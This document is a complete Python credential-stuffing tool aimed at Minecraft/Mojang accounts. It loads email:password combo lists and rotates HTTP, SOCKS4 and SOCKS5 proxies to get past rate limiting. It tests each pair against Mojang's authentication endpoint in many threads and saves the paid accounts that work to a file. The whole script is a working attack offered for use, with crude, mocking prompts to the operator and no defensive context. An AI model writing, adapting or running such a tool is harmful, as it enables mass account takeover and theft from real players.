import ctypes

import requests
import json
import os
import time
import sys
import random
from multiprocessing.dummy import Pool as ThreadPool
from proxy_checker import proxy_check, threads, proxies_json

working_accounts = []

combo_path = input("Where is your accounts/combo file located?\n") or False
if not combo_path:
    print("Hey moron, I need to where the focking accounts are to check them...\n")
    input("Press a key to close the program")
    sys.exit()

combos = [x.strip() for x in open(combo_path, "r", encoding="utf8", errors='ignore').readlines() if ":" in x]
if len(combos) == 0:
    print("You dont have any accounts/combos in that text file. Please remember: the format is\nemail:password\nemail:password\nGot it?")
    input("Press a key to close the program")
    sys.exit()
else:
    print(len(combos), "combos/accounts have been loaded\n")

http_proxy_path = input("Where is your http proxy file located? (leave empty if you dont have this type of proxy)\n") or False
if http_proxy_path:
    raw_http = [x.strip() for x in open(str(http_proxy_path), "r", encoding="utf8", errors='ignore').readlines() if ":" in x]
    if len(raw_http) == 0:
        print("Well, that focking list was empty, hope you knew that.")
        print("Just a reminder, the proxy file format is:\nip:port\nip:port")
    else:
        print(len(raw_http), "http proxies have been loaded\n")

socks4_proxy_path = input("Where is your socks4 proxy file located? (leave empty if you dont have this type of proxy)\n") or False
if socks4_proxy_path:
    raw_socks4 = [x.strip() for x in open(str(socks4_proxy_path), "r", encoding="utf8", errors='ignore').readlines() if ":" in x]
    if len(raw_socks4) == 0:
        print("Well, that focking list was empty, hope you knew that.")
        print("Just a reminder, the proxy file format is:\nip:port\nip:port")
    else:
        print(len(raw_socks4), "socks4 proxies have been loaded\n")

socks5_proxy_path = input("Where is your socks5 proxy file located? (leave empty if you dont have this type of proxy)\n") or False
if socks5_proxy_path:
    raw_socks5 = [x.strip() for x in open(str(socks5_proxy_path), "r", encoding="utf8", errors='ignore').readlines() if ":" in x]
    if len(raw_socks5) == 0:
        print("Well, that focking list was empty, hope you knew that.")
        print("Just a reminder, the proxy file format is:\nip:port\nip:port")
    else:
        print(len(raw_socks5), "socks5 proxies have been loaded\n")


if not any([http_proxy_path, socks4_proxy_path, socks5_proxy_path]):
    print("This program will be closed cause you focking need proxies.\nGet some proxies.")
    input("Press a key to close the program")
    sys.exit()


try_amount = int(input("How many times an account should be tested before marking it as invalid (min. 1 (Only go above 4 if you have a shittone of working proxies)? Default: 4 \n") or "5")


print("Starting to check proxies")

if http_proxy_path:
    print("\nStarted http proxy checking")
    proxy_check(raw_http, "http")
if socks4_proxy_path:
    print("\nStarted socks4 proxy checking")
    proxy_check(raw_socks4, "socks4")
if socks5_proxy_path:
    print("\nStarted socks5 proxy checking")
    proxy_check(raw_socks5, "socks5")
print("Done proxy checking")

header = {"content-type": "application/json"}

class stats:
    working = 0
    invalid = 0

def check(x):
    combo = combos[x].strip()
    username = combo.split(":")[0]
    password = combo.split(":")[1]
    body = json.dumps({
        'agent': {
            'name': 'Minecraft',
            'version': 1
        },
        'username': username,
        'password': password,
        'requestUser': 'true'
    })
    tries = 0
    while tries < try_amount:
        tries = tries + 1
        try:
            proxy = random.choice(list(proxies_json.keys()))
            proxy_type = proxies_json[proxy]["type"]
            if proxy_type == "http":
                proxy_dict = {
                    'http': "http://" + proxy,
                    'https': "https://" + proxy
                }
            else:
                proxy_dict = {
                    'http': proxy_type + "://" + proxy,
                    'https': proxy_type + "://" + proxy
                }

            answer = requests.post('https://authserver.mojang.com/authenticate',
                                   data=body,
                                   headers=header,
                                   proxies=proxy_dict,
                                   timeout=6).text
            answer_json = json.loads(answer)
            if bool(answer_json["availableProfiles"][0]["paid"]):
                working_accounts.append(combo)
                stats.working += 1
                return
        except Exception:
            pass
    stats.invalid += 1
    ctypes.windll.kernel32.SetConsoleTitleW(
            "simplecheck by scorpion3013 | " +
            "Combos left: " + str(len(combos) - (stats.invalid + stats.working)) +
            " | Working: " + str(stats.working) +
            " | Bad: " + str(stats.invalid))


def thread_starter(numbers, threads=threads):
    pool = ThreadPool(threads)
    results = pool.map(check, numbers)
    pool.close()
    pool.join()
    return results

if __name__ == "__main__":
    thread_number_list = []
    for x in range(0, len(combos)):
        thread_number_list.append(int(x))
    the_focking_threads = thread_starter(thread_number_list, threads)


print("Checking complete")
print("I found: " + str(len(working_accounts)) + " working accounts!")

file_name = time.strftime("minecraft_%d-%m-%Y %H-%M-%S.txt")

accounts_string = ""
for account in working_accounts:
    accounts_string = accounts_string + account + "\n"
open(file_name, "w").write(accounts_string)
input("Done uwu\n")